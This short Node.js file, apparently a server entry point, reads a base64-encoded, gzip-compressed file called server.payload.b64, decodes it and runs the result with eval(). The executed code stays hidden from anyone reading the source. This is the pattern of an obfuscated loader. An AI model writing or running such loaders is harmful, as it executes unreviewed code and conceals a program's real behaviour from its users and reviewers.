const zlib = require("zlib");
const fs = require("fs");
const path = require("path");

const payloadPath = path.join(__dirname, "server.payload.b64");
const payload = fs.readFileSync(payloadPath, "utf8").trim();
const source = zlib.gunzipSync(Buffer.from(payload, "base64")).toString("utf8");
eval(source);
